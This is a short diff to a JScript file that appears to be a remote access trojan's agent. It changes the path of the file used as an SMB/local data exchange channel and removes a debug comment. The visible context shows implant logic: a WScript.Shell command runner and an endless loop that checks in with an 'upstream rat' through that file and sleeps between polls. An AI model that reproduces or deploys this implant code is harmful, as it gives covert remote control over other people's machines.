@@ -1,5 +1,5 @@
 //Define variables
-var home = 'C:\\users\\kclark\\desktop\\test12.txt' // UNC or local path. Send and receive data through this file
+var home = 'C:\\users\\kclark\\test9.txt' // UNC or local path. Send and receive data through this file
 var sleepytime = 2000 //in milliseconds
 
 var runner = new ActiveXObject("WScript.Shell")
@@ -142,7 +142,6 @@ while(true)
     var retval = ""
     var recv_package = false
     var jsondata = smb_post(home, checkin);
-    //WScript.Echo("smb: got jsondata frm srv: "+jsondata)
     if(!jsondata) { // if no message from upstream rat, just wait and try again
       WScript.Sleep(sleepytime)
       continue
